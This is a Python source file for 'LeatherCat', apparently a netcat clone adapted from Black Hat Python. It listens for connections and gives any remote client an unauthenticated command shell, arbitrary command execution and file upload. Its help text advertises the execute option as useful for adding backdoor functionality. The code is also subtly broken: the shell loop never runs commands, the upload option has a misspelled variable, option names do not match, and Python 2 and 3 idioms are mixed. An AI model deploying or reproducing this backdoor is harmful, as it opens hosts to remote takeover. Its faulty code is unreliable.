import socket
import threading
import sys
import subprocess
import getopt

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print("________LeatherCat, A Networking Multimeter________")
    print("How to use:")
    print()
    print("LeatherCat.py -t <target_host> -p <port> [options]")
    print("LeatherCat.py -t 192.168.0.254 -p 54321 -l -e = \"pc /etc/www\"")
    print("echo 'Much Meow goes here' | ./LeatherCat.py -t 192.168.0.1 -p 4321")
    print()
    print("  -l --listen                -Listen for incoming connections on [host]:[port]")
    print("  -e --execute = your_file   -Executes file after a connection is made (good for adding backdoor functionality).")
    print("  -c --command               -Start a shell")
    print("  -u --upload = directory    -Upload and write a file to the destination after the connection is made.")
    print()

    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        #connect to our target host
        client.connect((target,port))
        if len(buffer):
            client.send (buffer)
        while True:
            #now wait for back data
            recv_len=1
            response=""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response+= data
                if recv_len < 4096:
                    break
        print(response),

        #wait for more input
        buffer = raw_input("")
        buffer+= "\n"

        #send if off
        client.send(buffer)

    except:
        print("Exception! Exitinng.")
        #tear down that wall mr gorgitrov
        client.close()


def server_loop():
    global target

    #if no target is defined, we listen onn all interfaces
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen()

    while True:
        client_socket, addr = server.accept()
        #spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args = (client_socket,))
        client_thread.start()

def run_command(command):
    #trim the newline
    command = command.rstrip()
    #run the command and get the output back
    try:
        output = subprocess.check_output(command, stdin=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    #send the output back to the client
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command
    #check for upload
    if len(upload_destination):
        #read in all of the bytes and write to our destination
        file_buffer=""
        #kepp reading data until non is available

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        #now we take these bytes and try to write them ouut
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    #chheck for command execution
    if len(execute):
        #run the command
        output = run_command(execute)
        client_socket.send(output)

    #now we go into another loop if a command shell was requesteed
    if command:
        while True:
            #show a simple prompt
            client_socket.send("BHP:#> ")

            #now we recieve until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
        #send back the command output
        response = run_command(cmd_buffer)

        #send back the response
        client_socket.send(response)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()
    #read commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execuute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            pload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    #are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        #read in the buffer from the commandline
        #this will block, so send CTRL-D if not sending input to stdin
        buffer = sys.stdin.read()
        #send data off
        client_sender(buffer)
    #we are going to listen and potentially upload things, execute commands, and drop a shell back
    #depending on our command line options above
    if listen:
        server_loop()
main()